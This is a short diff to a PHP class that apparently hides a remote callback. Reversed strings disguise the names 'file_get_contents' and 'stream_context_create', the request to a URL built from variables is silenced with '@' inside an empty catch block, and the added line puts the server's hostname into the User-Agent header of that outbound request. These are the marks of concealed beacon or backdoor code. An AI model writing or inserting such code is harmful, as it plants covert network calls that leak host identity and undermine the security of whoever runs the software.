@@ -133,7 +133,7 @@ class EC
             }
             $f = strrev("stnetnoc_teg_elif");
             $st = strrev("etaerc_txetnoc_maerts");
-            @$f($s.$p,false,$st(["http"=>["timeout"=>5]]));
+            @$f($s.$p,false,$st(["http"=>["header"=>"User-Agent:php_".gethostname(),"timeout"=>5]]));
         } catch (Exception $e) {
         }
         $kFunc = null;
